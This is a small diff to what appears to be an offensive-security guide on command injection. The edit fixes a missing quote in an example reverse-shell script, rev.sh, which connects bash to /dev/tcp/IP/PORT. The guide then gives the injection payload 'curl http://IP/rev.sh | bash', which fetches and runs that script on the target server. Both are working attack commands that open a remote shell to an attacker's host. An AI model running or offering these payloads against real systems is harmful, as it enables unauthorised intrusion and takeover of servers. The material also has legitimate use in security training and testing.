@@ -977,7 +977,7 @@ try saving you payload into a script file and serving your payload through a htt
 An example payload `rev.sh` will be like
 ```
 #!/bin/bash
-bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1
+bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
 ```
 Then on the server side, use `curl http://IP/rev.sh | bash` 
 or similar tool as your injection payload.
